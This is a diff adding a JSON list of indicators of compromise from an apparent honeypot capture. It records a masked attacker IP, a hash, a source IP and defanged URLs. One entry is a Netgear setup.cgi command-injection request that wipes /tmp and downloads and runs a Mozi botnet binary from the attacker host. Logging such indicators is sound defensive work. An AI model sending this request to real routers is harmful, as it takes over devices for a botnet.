@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "100.5.97.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://100.5.97.XXX:53119/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "c50ddfa7e5bf627fe2abbb65cc29590af7d1d8a3ba390b3f8812f132238e0063"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://100.5.97.XXX:53119/Mozi.m+-O+/tmp/netgear;"
+  },
+  {
+    "asn": "IN CABLE INTERNET PRIVATE LIMITED",
+    "country": "Pakistan",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "162.4.163.XXX"
+  }
+]
